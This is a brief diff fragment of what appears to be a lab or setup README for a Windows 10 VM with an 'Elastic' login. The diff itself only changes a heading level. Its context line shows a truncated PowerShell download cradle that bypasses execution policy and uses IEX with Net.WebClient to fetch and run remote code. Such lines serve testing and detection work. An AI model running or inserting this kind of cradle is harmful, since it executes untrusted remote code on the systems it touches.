@@ -172,7 +172,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
   
 </details>
 
-### VM Credentials
+## VM Credentials
 
 **Windows 10 Login**  
 > **User:**     Elastic    
